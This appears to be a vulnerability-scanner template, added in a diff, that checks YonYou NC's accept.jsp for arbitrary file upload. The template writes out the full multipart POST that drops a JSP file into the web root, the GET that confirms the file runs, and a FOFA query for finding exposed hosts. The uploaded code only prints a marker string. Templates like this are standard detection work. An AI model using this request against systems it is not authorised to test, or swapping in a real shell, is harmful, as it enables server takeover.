@@ -1,0 +1,124 @@
+{
+  "id": "yonyou-nc-accept-fileupload",
+  "name": "YonYou NC Accept Upload - Arbitray File Upload",
+  "author": "SleepingBag945",
+  "severity": "CRITICAL",
+  "description": "Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.\n",
+  "references": [
+    "http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html",
+    "https://mp.weixin.qq.com/s?__biz\u003dMzkyMTMwNjU1Mg\u003d\u003d\u0026chksm\u003dc184c6a1f6f34fb788437557f0e7708c74b16928e5973772db09b12067f10cf28b108701f67a\u0026idx\u003d1\u0026lang\u003dzh_CN\u0026mid\u003d2247488118\u0026sn\u003d16217c422eafc656df5fcacee9aa2153\u0026token\u003d857848930#rd"
+  ],
+  "tags": [
+    "yonyou",
+    "nc",
+    "intrusive",
+    "fileupload"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "icon_hash\u003d\"1085941792\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /aim/equipmap/accept.jsp HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d---------------------------16314487820932200903769468567\nAccept-Encoding: gzip\n\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name\u003d\"upload\"; filename\u003d\"{{randstr_1}}.txt\"\nContent-Type: text/plain\n\n\u003c% out.println(\"{{randstr_2}}\"); %\u003e\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name\u003d\"fname\"\n\n\\webapps\\nc_web\\{{randstr_3}}.jsp\n-----------------------------16314487820932200903769468567--\n",
+        "GET /{{randstr_3}}.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 200",
+            "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(body_2,\u0027{{randstr_2}}\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "yonyou-nc-accept-fileupload",
+    "info": {
+      "name": "YonYou NC Accept Upload - Arbitray File Upload",
+      "author": "SleepingBag945",
+      "severity": "critical",
+      "description": "Arbitrary file upload vulnerability in UFIDA N C accept.jsp . An attacker can obtain website permissions through the vulnerability.\n",
+      "reference": [
+        "http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html",
+        "https://mp.weixin.qq.com/s?__biz\u003dMzkyMTMwNjU1Mg\u003d\u003d\u0026chksm\u003dc184c6a1f6f34fb788437557f0e7708c74b16928e5973772db09b12067f10cf28b108701f67a\u0026idx\u003d1\u0026lang\u003dzh_CN\u0026mid\u003d2247488118\u0026sn\u003d16217c422eafc656df5fcacee9aa2153\u0026token\u003d857848930#rd"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 2,
+        "fofa_query": "icon_hash\u003d\"1085941792\""
+      },
+      "tags": "yonyou,nc,intrusive,fileupload"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /aim/equipmap/accept.jsp HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d---------------------------16314487820932200903769468567\nAccept-Encoding: gzip\n\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name\u003d\"upload\"; filename\u003d\"{{randstr_1}}.txt\"\nContent-Type: text/plain\n\n\u003c% out.println(\"{{randstr_2}}\"); %\u003e\n-----------------------------16314487820932200903769468567\nContent-Disposition: form-data; name\u003d\"fname\"\n\n\\webapps\\nc_web\\{{randstr_3}}.jsp\n-----------------------------16314487820932200903769468567--\n",
+          "GET /{{randstr_3}}.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 200",
+              "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(body_2,\u0027{{randstr_2}}\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
